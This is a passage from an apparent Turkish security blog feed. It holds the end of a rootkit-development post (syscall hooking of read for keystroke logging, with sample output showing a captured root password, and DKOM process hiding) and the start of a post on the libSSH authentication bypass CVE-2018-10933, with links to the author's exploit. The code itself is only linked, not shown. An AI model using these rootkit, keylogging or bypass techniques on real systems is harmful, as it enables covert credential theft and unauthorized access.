  &lt;li&gt;&lt;strong&gt;m_len&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Bu alan &lt;strong&gt;mbuf&lt;/strong&gt; içerisinde yer alan &lt;strong&gt;*Veri Miktarı&lt;/strong&gt;‘nı tutmaktadır.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;m_data&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Bu alan &lt;strong&gt;mbuf&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;Veri&lt;/strong&gt;‘yi tutar.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Aynı zamanda bir &lt;strong&gt;Rootkit&lt;/strong&gt; içerisinde &lt;strong&gt;Communication Protocol&lt;/strong&gt;‘unu &lt;strong&gt;Hook&lt;/strong&gt; etmek istersek bakmamız gereken ilk &lt;strong&gt;Structure&lt;/strong&gt;‘den biridir &lt;strong&gt;mbuf&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Yani daha da basit şekilde bir &lt;strong&gt;Rootkit&lt;/strong&gt; istediği &lt;strong&gt;İletişim Protokol&lt;/strong&gt;‘u üzerinde değişiklik yapabilir yada bu &lt;strong&gt;İletişim Protokol&lt;/strong&gt;‘unun kullanıldığı yerdeki &lt;strong&gt;Veri&lt;/strong&gt; akışını &lt;strong&gt;Okuyabilir&lt;/strong&gt; ya da &lt;strong&gt;Düzenleyebilir&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;kernel-process-tracing-nedir-&quot;&gt;Kernel Process Tracing Nedir ?&lt;/h2&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;Kernel&lt;/strong&gt; izleme ve hata ayıklama tekniğidir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Kernel Operasyon&lt;/strong&gt;‘larına aşşağıdaki listede yazanları uygulayabiliriz.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Kayıt Altında Tutmak ( Logging )&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;İzlemek, yolunu kesmek ( Intercept )&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Ayıklamak ( Debugging )&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ftrace ile &lt;strong&gt;Kernel&lt;/strong&gt;‘i debug edip bunu yazıya döken bir ingiliz arkadaşımız : &lt;a href=&quot;https://jvns.ca/blog/2017/03/19/getting-started-with-ftrace/&quot;&gt;Debugging the kernel using Ftrace &lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘in bu işlemi gerçekleştirmesinin sebebi musallat olacağı &lt;strong&gt;Yazılım&lt;/strong&gt; varsa şayet o &lt;strong&gt;Yazılım&lt;/strong&gt;‘ın kullandığı &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘larını bulup onlar için birer &lt;strong&gt;Hook&lt;/strong&gt; yazmaktır.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/TltHyI.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Daha önceki yazımda &lt;strong&gt;getdirents&lt;/strong&gt; sistem çağrısını &lt;strong&gt;Hook&lt;/strong&gt; edip &lt;strong&gt;ls&lt;/strong&gt; komutundan &lt;strong&gt;Dosya Gizleme&lt;/strong&gt;‘yi anlatmıştım. Ve küçük bir &lt;strong&gt;Rootkit&lt;/strong&gt; yazmıştık o yazımda. Eğer okumadıysanız bu yazıyı okumaya başlamadan önce aşşağıda listelediğim yazılarımı okuyun lütfen.&lt;/p&gt;

&lt;p&gt;Çünkü bu yazıda çok &lt;strong&gt;Teknik&lt;/strong&gt; detaya girmesemde bazılarımıza çok &lt;strong&gt;Teknik&lt;/strong&gt; gelebilir o yüzden &lt;strong&gt;0&lt;/strong&gt;‘dan başlaması onun için iyi olacaktır.&lt;/p&gt;

&lt;p&gt;Yazılarım :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blacknbunny.github.io/2019/04/22/loadable-kernel-module.html&quot;&gt;LKM Development&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blacknbunny.github.io/2019/04/14/Linux-Function-Hooking.html&quot;&gt;Linux Function Hooking&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blacknbunny.github.io/2019/05/07/linux-system-call-hooking.html&quot;&gt;Linux System Call Hooking&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;keystroke-logging&quot;&gt;Keystroke Logging&lt;/h2&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘sını &lt;strong&gt;Hook&lt;/strong&gt; ederek &lt;strong&gt;Klavye&lt;/strong&gt;‘de basılan tuşların kayıtlarını tutabiliriz.&lt;/p&gt;

&lt;p&gt;Örneğin &lt;strong&gt;read&lt;/strong&gt; sistem çağrısını &lt;strong&gt;Hook&lt;/strong&gt; ederek bu işe başlayabiliriz.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘sının &lt;strong&gt;C Library&lt;/strong&gt; hali şöyle :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/uio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

ssize_t
read(int fd, void *buf, size_t nbytes);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bu &lt;strong&gt;Sistem Çağrı&lt;/strong&gt;‘sını kendi yazdığımız &lt;strong&gt;Sahte Sistem Çağrı&lt;/strong&gt;‘sı ile değiştirirsek şayet ne zaman &lt;strong&gt;read&lt;/strong&gt; sistem çağrısı kullanılsa kullanıldığı yeri kaydet diyebiliriz &lt;strong&gt;Rootkit&lt;/strong&gt;‘imize.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;read&lt;/strong&gt; sistem çağrısı &lt;strong&gt;nbytes&lt;/strong&gt; kısmından &lt;strong&gt;Veri&lt;/strong&gt;‘yi alıp bunu &lt;strong&gt;buf&lt;/strong&gt; parametresine gönderir.&lt;/p&gt;

&lt;p&gt;Bir &lt;strong&gt;Klavye Tuş Vuruşu&lt;/strong&gt;‘nu yakalamak için &lt;strong&gt;buf&lt;/strong&gt; parametresinin &lt;strong&gt;İçeriğini&lt;/strong&gt; kaydetmemiz gerekmektedir. Ne zaman &lt;strong&gt;fd&lt;/strong&gt; parametresi &lt;strong&gt;Standart Input&lt;/strong&gt;‘a işaret eder örneğin (file descriptor 0) o zaman &lt;strong&gt;Klavye Tuş Vuruş&lt;/strong&gt;‘larını yakalayabiliriz demektir.&lt;/p&gt;

&lt;p&gt;Aşşağıdaki &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘u &lt;strong&gt;read&lt;/strong&gt; sistem çağrısını &lt;strong&gt;Hook&lt;/strong&gt; edip &lt;strong&gt;Klavye Tuş Vuruş&lt;/strong&gt;‘larını &lt;strong&gt;Kernel&lt;/strong&gt; içerisinde kaydetmek için yazılmıştır.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;read Sistem Çağrısı Hook&lt;/strong&gt; : &lt;a href=&quot;https://pastebin.com/9hGXGtKL&quot;&gt;Pastebin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Hook&lt;/strong&gt;‘u sisteme &lt;strong&gt;Load&lt;/strong&gt; ettikten yani &lt;strong&gt;Yükledik&lt;/strong&gt;‘ten sonra son durum :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;login: root
Password:
Last login: Mon Feb 9 00:15:22 on ttyv2

root@vvmnx ~# dmesg | tail -n 32
r
o
o
t

s
i
f
r
e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Gördüğünüz gibi &lt;strong&gt;Giriş Bilgi&lt;/strong&gt;‘leri &lt;strong&gt;Kernel&lt;/strong&gt; içerisinde kayıt altında tutuldu ve biz &lt;strong&gt;Şifre&lt;/strong&gt;‘yi bilmesekte göremesekte bu şekilde bulmuş olduk.&lt;/p&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;Keystroke Logging&lt;/strong&gt;‘i gerçekleştirmek için yollardan biri olan &lt;strong&gt;read&lt;/strong&gt; sistem çağrısını &lt;strong&gt;Hook&lt;/strong&gt; ettik.&lt;/p&gt;

&lt;h1 id=&quot;kernel-object-nedir-&quot;&gt;Kernel Object Nedir ?&lt;/h1&gt;

&lt;p&gt;Bir &lt;strong&gt;Kernel&lt;/strong&gt; yani &lt;strong&gt;Çekirdek&lt;/strong&gt; geliştiriciye kendisinden birçok özellik sunmaktadır örneğin (Process, Socket, Thread, Mutex) vs… gibi.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Object&lt;/strong&gt;‘ler yani &lt;strong&gt;Nesne&lt;/strong&gt;‘lerde bunlardan biridir.&lt;/p&gt;

&lt;p&gt;Bir &lt;strong&gt;Kernel&lt;/strong&gt; nesnesi basitce bir &lt;strong&gt;Memory Block&lt;/strong&gt;‘tur. Yani bir &lt;strong&gt;Structure&lt;/strong&gt; yani &lt;strong&gt;Yapı&lt;/strong&gt; düşünün ve bu yapının içerisinde &lt;strong&gt;Nesne&lt;/strong&gt; yani &lt;strong&gt;Object&lt;/strong&gt; hakkında bilgilerin tutulduğunu. Ve bu bilgileri tutan birçok &lt;strong&gt;Alan&lt;/strong&gt; olduğunu.&lt;/p&gt;

&lt;p&gt;Örneğin &lt;strong&gt;Object&lt;/strong&gt;‘lere örnek olması için (ID, Process Object) gibi terimler gösterilebilir.&lt;/p&gt;

&lt;p&gt;Yada daha güzel bir örnek olması için aşşağıdaki resme bakabiliriz :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/4pgDMX.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yukarıdaki liste &lt;strong&gt;Windows İşletim Sistemi&lt;/strong&gt; içerisindeki &lt;strong&gt;Nesne&lt;/strong&gt;‘lerdir. Bu &lt;strong&gt;Nesne&lt;/strong&gt;‘lerin &lt;strong&gt;Manipulasyon&lt;/strong&gt;‘u mümkündür.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Manipulasyon&lt;/strong&gt; işlemi için aşşağıdaki başlığı inceleyelim.&lt;/p&gt;

&lt;h2 id=&quot;direct-kernel-object-manipulation&quot;&gt;Direct Kernel Object Manipulation&lt;/h2&gt;

&lt;p&gt;Bu &lt;strong&gt;Nesne&lt;/strong&gt;‘leri &lt;strong&gt;Direkt&lt;/strong&gt; olarak &lt;strong&gt;Manipule&lt;/strong&gt; etmeye &lt;strong&gt;Direct Kernel Object Manipulation&lt;/strong&gt; adı verilir.&lt;/p&gt;

&lt;p&gt;Basitçe &lt;strong&gt;Windows&lt;/strong&gt; için &lt;strong&gt;Processes&lt;/strong&gt;, &lt;strong&gt;Drivers&lt;/strong&gt;, &lt;strong&gt;Files&lt;/strong&gt; ve &lt;strong&gt;intermediate connection&lt;/strong&gt;‘ları &lt;strong&gt;Task Manager&lt;/strong&gt; ve &lt;strong&gt;Event Scheduler&lt;/strong&gt;‘den gizlemek içi bir &lt;strong&gt;Rootkit&lt;/strong&gt; tekniğidir.&lt;/p&gt;

&lt;p&gt;Kısaltması &lt;strong&gt;DKOM&lt;/strong&gt;‘dur ve &lt;strong&gt;*DKOM&lt;/strong&gt;‘un içerik listesi aşşağıdaki gibidir :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Hide process&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Hide drivers&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Hide ports&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Elevate privilege level of threads and processes&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Skew forensics&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Full control of system&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Veri Yapı&lt;/strong&gt;‘larını yani &lt;strong&gt;Data Structure&lt;/strong&gt;‘lerini &lt;strong&gt;Manipule&lt;/strong&gt; edeceğimizden &lt;strong&gt;DKOM&lt;/strong&gt; bize &lt;strong&gt;Process&lt;/strong&gt;, &lt;strong&gt;Driver&lt;/strong&gt;, &lt;strong&gt;Port&lt;/strong&gt; gibi terimleri &lt;strong&gt;İşletim Sistemi&lt;/strong&gt; içerisinde gizlememizi sağlayabilir.&lt;/p&gt;

&lt;p&gt;İlk üçü bu şekilde. Diğerleri ise isimlerindende anlaşılabileceği gibi &lt;strong&gt;Yetki Seviyesi Yükseltmek&lt;/strong&gt;, &lt;strong&gt;Adli Tıp*, **Sistemin Tüm Kontrolu&lt;/strong&gt; gibi durumları baz alıyor.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Data Structure&lt;/strong&gt;‘lerini &lt;strong&gt;Manipule&lt;/strong&gt; ederek &lt;strong&gt;DKOM&lt;/strong&gt; sayesinde üstünden gelebileceğimiz çoğu şey böyle.&lt;/p&gt;

&lt;p&gt;Daha da basit anlatırsam örneğin &lt;strong&gt;EPROCESS Data Structure&lt;/strong&gt;‘sini &lt;strong&gt;DKOM&lt;/strong&gt; tekniği ile manipule etmek istersek şayet :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://i159.photobucket.com/albums/t141/sovietweasel/plist.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yukarıdaki &lt;strong&gt;Data Structure&lt;/strong&gt;‘deki &lt;strong&gt;Forward link&lt;/strong&gt; ve &lt;strong&gt;Back link&lt;/strong&gt; kısımlarını &lt;strong&gt;Direkt&lt;/strong&gt; olarak &lt;strong&gt;Manipule&lt;/strong&gt; edip bizim &lt;strong&gt;Rootkit Process&lt;/strong&gt;‘imizi &lt;strong&gt;Task Manager&lt;/strong&gt; gibi &lt;strong&gt;Process&lt;/strong&gt; görüntüleme araçlarından gizleyebiliyoruz.&lt;/p&gt;

&lt;p&gt;Bazen &lt;strong&gt;Hooking&lt;/strong&gt; tekniği işe yaramadığı zaman bir &lt;strong&gt;Sistem&lt;/strong&gt;‘de diğer &lt;strong&gt;Rootkit&lt;/strong&gt; tekniklerini kullanmamız gerekebiliyor ve bu tekniklerden biride &lt;strong&gt;DKOM&lt;/strong&gt;‘dur.&lt;/p&gt;

&lt;p&gt;Tabi bu kadar ile sınırlı değil. &lt;strong&gt;DKOM&lt;/strong&gt;‘un daha derinlerine inmek isteyenler ve tekniği çok daha yakından tanımak isteyenlerimiz varsa bir &lt;strong&gt;Wikipedia&lt;/strong&gt; kaynağı bırakıyorum alta.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Direct_kernel_object_manipulation&quot;&gt;Direct Kernel Object Manipulation (DKOM) wikipedia&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;the-end&quot;&gt;THE END&lt;/h1&gt;

&lt;p&gt;Bu yazımızında sonuna geldik.&lt;/p&gt;

&lt;p&gt;Çok fazla detaya girmeden &lt;strong&gt;Rootkit&lt;/strong&gt; serimizin ilk partını bitirdik.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Part 2&lt;/strong&gt;‘de daha da teknik detaya gireceğiz. Bir &lt;strong&gt;Rootkit&lt;/strong&gt;‘i başından sonuna nasıl geliştirebileceğimiz nelere dikkat etmemiz gerektiği gibi konulara ve daha bir çok teknik detaya değineceğiz.&lt;/p&gt;

&lt;p&gt;Sorular için : &lt;a href=&quot;https://www.twitter.com/0DAYanc&quot;&gt;Twitter @0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Rootkit Development - (Part 1)</summary></entry><entry><title type="html">CVE Analizi ve Exploit Development</title><link href="http://localhost:4000/2019/05/24/cve-analizi-ve-exploit-development.html" rel="alternate" type="text/html" title="CVE Analizi ve Exploit Development" /><published>2019-05-24T00:00:00+03:00</published><updated>2019-05-24T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/24/cve-analizi-ve-exploit-development</id><content type="html" xml:base="http://localhost:4000/2019/05/24/cve-analizi-ve-exploit-development.html">&lt;h1 id=&quot;cve-analizi-ve-exploit-development&quot;&gt;CVE Analizi ve Exploit Development&lt;/h1&gt;

&lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;CVE Analizi&lt;/strong&gt; ve &lt;strong&gt;Exploit Development&lt;/strong&gt; isimli yazıma hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;Bu yazımda size &lt;strong&gt;CVE&lt;/strong&gt;‘nin ne olduğundan bunun analizinin nasıl yapılacağından ve bu &lt;strong&gt;CVE&lt;/strong&gt;‘lere yönelik &lt;strong&gt;Exploit&lt;/strong&gt;‘in nasıl geliştirilmesi gerektiğinden bahsedeceğim.&lt;/p&gt;

&lt;p&gt;Yazıma geçmeden önce sizlere kısa bir süre önce piyasayı sallayan &lt;strong&gt;libSSH&lt;/strong&gt;‘den ve bunun ilk &lt;strong&gt;Exploit&lt;/strong&gt;‘ini nasıl yazdığımdan bahsedeceğim.&lt;/p&gt;

&lt;h1 id=&quot;libssh-nedir-&quot;&gt;libSSH Nedir ?&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;libSSH&lt;/strong&gt; basit bir şekilde &lt;strong&gt;C&lt;/strong&gt; ile yazılmış bir kütüphanedir ve bu kütüphane &lt;strong&gt;Protocol&lt;/strong&gt; olarak şuanda &lt;strong&gt;SSHv2&lt;/strong&gt; protokolünü kullanmaktadır.&lt;/p&gt;

&lt;p&gt;Sunucular bu kütüphaneyi kullanarak &lt;strong&gt;Client&lt;/strong&gt; ve &lt;strong&gt;Server&lt;/strong&gt; tarafında &lt;strong&gt;SSH&lt;/strong&gt; bağlantıları oluşturmaktadır.&lt;/p&gt;

&lt;h1 id=&quot;piyasayı-sallayan-libssh-zafiyeti&quot;&gt;Piyasayı sallayan libSSH zafiyeti&lt;/h1&gt;

&lt;p&gt;Çok kısa bir süre öncesinde internet üzerinde &lt;strong&gt;Peter Winter-Smith&lt;/strong&gt; tarafından ortaya çıkarılmış bir zafiyettir bu.&lt;/p&gt;

&lt;p&gt;Bu zafiyetin içeriğini basit bir şekilde anlatacak olursam şayet :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/JUzxiw.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;Sandviç&lt;/strong&gt; istediğimizde &lt;strong&gt;Hayır&lt;/strong&gt; deniliyor şayet &lt;strong&gt;Sandviç Success&lt;/strong&gt; dediğimizde şartsız bir şekilde karşıdaki hemen yapayım efendim diyor.&lt;/p&gt;

&lt;p&gt;Yani daha da teknik bir şekilde açıklarsam bir &lt;strong&gt;Sunucu&lt;/strong&gt; içerisine &lt;strong&gt;Kullanıcı Adı&lt;/strong&gt; ve &lt;strong&gt;Şifre&lt;/strong&gt; vermeden sadece karşıya &lt;strong&gt;MSG_USERAUTH_SUCCESS&lt;/strong&gt;  diyerek girebiliyoruz.&lt;/p&gt;

&lt;p&gt;Daha da basit şekilde &lt;strong&gt;libSSH&lt;/strong&gt;‘in &lt;strong&gt;0.6&lt;/strong&gt; versiyonun sonrasını kullanan tüm &lt;strong&gt;Sunucu&lt;/strong&gt;‘lara kullanıcı bilgilerini vermeden giriş yapabiliyorduk.&lt;/p&gt;

&lt;p&gt;Ve buda piyasada çok büyük bir yankı oluşturdu.&lt;/p&gt;

&lt;h1 id=&quot;zafiyetin-ortaya-çıktığını-nasıl-bulup-exploitini-buna-yazdım-&quot;&gt;Zafiyetin ortaya çıktığını nasıl bulup exploit’ini buna yazdım ?&lt;/h1&gt;

&lt;p&gt;Bu &lt;strong&gt;zafiyet&lt;/strong&gt;‘i her saniye yenilenen &lt;strong&gt;CVE&lt;/strong&gt; listesini incelerken aniden gördüm.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2018-10933&quot;&gt;libSSH CVE&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ve &lt;strong&gt;libSSH&lt;/strong&gt;‘te bulunan zafiyetin ne olduğuna dair bir açıklama bulunduğundan hemen onu okumaya koyuldum.&lt;/p&gt;

&lt;p&gt;Açıklama :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;A vulnerability was found in libssh’s server-side state machine before versions 0.7.6 and 0.8.4. A malicious client could create channels without first performing authentication, resulting in unauthorized access.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ve hızlı bir şekilde &lt;strong&gt;libSSH&lt;/strong&gt; kütüphanesinin kodlarını incelemeye başladım.&lt;/p&gt;

&lt;p&gt;Bu kodlar içinde şu kısım çok ilgimi çekti :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/zfy1mC.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Çünkü bu kısımda geçen diyalog basit bir şekilde şöyle :&lt;/p&gt;

&lt;p&gt;Eğer oturum içerisinde &lt;strong&gt;SSH_AUTH_STATE_SUCCESS&lt;/strong&gt;  mevcut ise &lt;strong&gt;Kullanıcı Adı&lt;/strong&gt; ve &lt;strong&gt;Şifre&lt;/strong&gt; istemeden girişi gerçekleştir.&lt;/p&gt;

&lt;p&gt;Bende bunu anladıktan sonra bir &lt;strong&gt;Exploit&lt;/strong&gt; geliştirdim. Karşıda &lt;strong&gt;libSSH&lt;/strong&gt; kullanan &lt;strong&gt;Sunucu&lt;/strong&gt;‘da &lt;strong&gt;Komut&lt;/strong&gt; çalıştırmayı basitleştirmek için.&lt;/p&gt;

&lt;p&gt;Bu yazdığım &lt;strong&gt;Exploit&lt;/strong&gt; twitterde çoğu yerde paylaşıldı ve &lt;strong&gt;Github&lt;/strong&gt; içerisinde baya bir &lt;strong&gt;Star&lt;/strong&gt; aldı.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Github&lt;/strong&gt;‘ta paylaştığım bu &lt;strong&gt;Exploit&lt;/strong&gt;‘in linki : &lt;a href=&quot;https://github.com/blacknbunny/libSSH-Authentication-Bypass&quot;&gt;libSSH Exploit Github&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hatta twitterde &lt;strong&gt;16 yaşındaki dayanç soyadlı’nın libSSH için geliştirdiği exploit&lt;/strong&gt; diye paylaşan bir çok ingiliz arkadaş gördüm bunlardan biri :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/5G8VJu.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploit&lt;/strong&gt;‘i yazdıktan sonra &lt;strong&gt;Shodan&lt;/strong&gt; içerisinden baktığımda twitterde ne kadar &lt;strong&gt;6500&lt;/strong&gt; tane potansiyel olarak hacklenmiş sistem olduğunu görsemde &lt;strong&gt;Shodan&lt;/strong&gt;‘da bu sayı &lt;strong&gt;50,000&lt;/strong&gt;‘i geçmişti.&lt;/p&gt;

&lt;p&gt;Hatta &lt;strong&gt;Liveoverflow&lt;/strong&gt; kanalının sahibine bu &lt;strong&gt;Zafiyet&lt;/strong&gt; hakkında video çekecekmisin sorusunu sorduğumda &lt;strong&gt;Twitter&lt;/strong&gt;‘den verdiği cevap şu oldu :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/Du3nof.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ve yazdığım &lt;strong&gt;Exploit&lt;/strong&gt;‘in ne kadarda büyük bir sonuca ulaştığını gördüm bu şekilde tabi yukarıda anlattığım şeyler bir kısmı.&lt;/p&gt;

&lt;p&gt;Bu yazdığım &lt;strong&gt;Exploit&lt;/strong&gt; bir çok &lt;strong&gt;CVE&lt;/strong&gt; listesinde yayımlanmış bulunmaktadır :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/Hzoku8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aynı zamanda &lt;strong&gt;Exploti-DB&lt;/strong&gt; içerisinde de yayınlandı : &lt;a href=&quot;https://www.exploit-db.com/exploits/45638&quot;&gt;libSSH Exploit&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Şimdi gelelim bir &lt;strong&gt;CVE&lt;/strong&gt;‘nin ne olduğuna bunun nasıl analizinin yapılacağına ve bunun için &lt;strong&gt;Exploit&lt;/strong&gt;‘in nasıl geliştirileceğine.&lt;/p&gt;

&lt;h1 id=&quot;cve-nedir&quot;&gt;CVE Nedir&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;CVE&lt;/strong&gt; bilgi güvenliği zafiyetlerinin bir listesidir.&lt;/p&gt;

&lt;p&gt;Daha basit bir şekilde bir &lt;strong&gt;Zafiyet&lt;/strong&gt;‘in açıklandığı ve var ise şayet &lt;strong&gt;Exploit&lt;/strong&gt;‘lerinin bulunduğu bir kayıttır.&lt;/p&gt;

&lt;p&gt;Bir kaç tane &lt;strong&gt;CVE&lt;/strong&gt; paylaşım sitesi :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://cve.mitre.org/cve/&quot;&gt;CVE Mitre&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/&quot;&gt;CVE NVD&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.cvedetails.com/bugtraq-list/&quot;&gt;CVE details&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;cve-analizi&quot;&gt;CVE Analizi&lt;/h1&gt;

&lt;p&gt;Öncelikle bir &lt;strong&gt;CVE&lt;/strong&gt; bulalım.&lt;/p&gt;

&lt;p&gt;Ben &lt;strong&gt;libSSH&lt;/strong&gt;‘den başladığım için aynı şekilde devam edeceğim.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/90kjVo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;CVE&lt;/strong&gt; listesi içerisinde benim &lt;strong&gt;Exploit&lt;/strong&gt;‘ini yazdığım &lt;strong&gt;CVE&lt;/strong&gt;‘nin &lt;strong&gt;ID&lt;/strong&gt;‘si &lt;strong&gt;CVE-2018-10933&lt;/strong&gt; basit bir şekilde daha bu &lt;strong&gt;CVE&lt;/strong&gt;‘nin içerisine girmeden bu &lt;strong&gt;Zafiyet&lt;/strong&gt;‘in ne olduğu açıklanıyor.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;CVE&lt;/strong&gt; kaydına girip benimle ilerlemek isteyenler için link : &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2018-10933/&quot;&gt;CVE-2018-10933&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Şimdi bu &lt;strong&gt;CVE&lt;/strong&gt;‘nin içerisine girdikten sonra içerisinde &lt;strong&gt;CVE&lt;/strong&gt;‘nin &lt;strong&gt;CVSS Score&lt;/strong&gt;‘unu görebiliriz yani ne kadar &lt;strong&gt;Kritik&lt;/strong&gt; olduğunu.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/R9izHT.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aynı zamanda bu &lt;strong&gt;Zafiyet&lt;/strong&gt;‘ten etkilenen &lt;strong&gt;Product&lt;/strong&gt;‘larıda görebiliyoruz :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/7SUpDm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Zafiyet&lt;/strong&gt; için bulunan &lt;strong&gt;Referans&lt;/strong&gt;‘larıda görebiliyoruz ayrıca.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Referans&lt;/strong&gt;‘lar içerisinde &lt;strong&gt;Zafiyet&lt;/strong&gt;‘in yazılmış ise &lt;strong&gt;Exploit&lt;/strong&gt;‘ide bulunur.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/g6sR9C.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Burada bulunan &lt;strong&gt;Exploit-DB&lt;/strong&gt; linki benim size başta bahsettiğim kendi yazdığım &lt;strong&gt;Exploit&lt;/strong&gt;‘tir.&lt;/p&gt;

&lt;p&gt;Şimdi bu &lt;strong&gt;Exploit&lt;/strong&gt;‘i nasıl geliştirdiğime yani bir &lt;strong&gt;CVE&lt;/strong&gt;‘nin &lt;strong&gt;Analiz&lt;/strong&gt;‘i sonrası o &lt;strong&gt;CVE&lt;/strong&gt; için &lt;strong&gt;Exploit&lt;/strong&gt;‘in nasıl geliştirileceğinden bahsedeceğim.&lt;/p&gt;

&lt;h1 id=&quot;exploit-development&quot;&gt;Exploit Development&lt;/h1&gt;

